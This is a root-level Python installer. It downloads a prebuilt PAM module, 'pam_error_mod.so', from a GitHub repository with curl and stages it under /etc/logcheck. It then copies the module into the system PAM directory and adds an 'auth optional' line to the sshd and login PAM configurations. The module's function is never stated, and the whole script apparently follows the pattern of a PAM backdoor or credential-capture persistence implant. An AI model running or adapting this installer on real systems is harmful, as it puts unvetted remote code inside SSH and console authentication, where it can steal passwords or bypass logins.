#!/usr/bin/env python3

import os
import shutil
import subprocess
from datetime import datetime

# =========================
# CONFIGURATION
# =========================
MODULE_NAME = "pam_error_mod.so"
DOWNLOAD_URL = "https://github.com/ThePyroArsonist/PAMModule/raw/refs/heads/master/PAM%20Module/pam_error_mod.so"
TMP_PATH = f"/etc/logcheck/{MODULE_NAME}"

PAM_TARGET_FILES = [
    "/etc/pam.d/sshd",
    "/etc/pam.d/login",
]

PAM_LINE = f"auth optional {MODULE_NAME}"

# =========================

def require_root():
    if os.geteuid() != 0:
        print("[!] Run as root.")
        exit(1)

def detect_lib_path():
    if os.path.exists("/lib64/security"):
        return "/lib64/security"
    elif os.path.exists("/lib/security"):
        return "/lib/security"
    else:
        print("[!] Could not find PAM module directory.")
        exit(1)

def backup_file(path):
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_path = f"{path}.bak.{timestamp}"
    shutil.copy2(path, backup_path)
    print(f"[+] Backup created: {backup_path}")

def download_module():
    print(f"[+] Downloading module from {DOWNLOAD_URL}")

    result = subprocess.run(
        ["curl", "-L", "-o", TMP_PATH, DOWNLOAD_URL],
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print("[!] Download failed:")
        print(result.stderr)
        exit(1)

    if not os.path.exists(TMP_PATH):
        print("[!] Downloaded file not found.")
        exit(1)

    print(f"[+] Downloaded to {TMP_PATH}")

def install_module(lib_path):
    dest_path = os.path.join(lib_path, MODULE_NAME)

    shutil.copy2(TMP_PATH, dest_path)
    os.chmod(dest_path, 0o755)

    print(f"[+] Installed module to {dest_path}")
    return dest_path

def update_pam_file(pam_file):
    if not os.path.exists(pam_file):
        print(f"[-] Skipping missing: {pam_file}")
        return

    with open(pam_file, "r") as f:
        lines = f.readlines()

    # Prevent duplicate insertion
    if any(MODULE_NAME in line for line in lines):
        print(f"[=] Already present in {pam_file}")
        return

    backup_file(pam_file)

    inserted = False
    for i, line in enumerate(lines):
        if line.strip().startswith("auth"):
            lines.insert(i + 1, PAM_LINE + "\n")
            inserted = True
            break

    if not inserted:
        lines.append(PAM_LINE + "\n")

    with open(pam_file, "w") as f:
        f.writelines(lines)

    print(f"[+] Updated {pam_file}")

def cleanup():
    if os.path.exists(TMP_PATH):
        os.remove(TMP_PATH)
        print("[+] Cleaned up temp file")

def main():
    require_root()

    lib_path = detect_lib_path()
    print(f"[+] Using PAM directory: {lib_path}")

    download_module()
    install_module(lib_path)

    for pam_file in PAM_TARGET_FILES:
        update_pam_file(pam_file)

    cleanup()

    print("\n[✓] Installation complete.")
    print("[!] Test with SSH/login immediately to confirm no lockout.")

if __name__ == "__main__":
    main()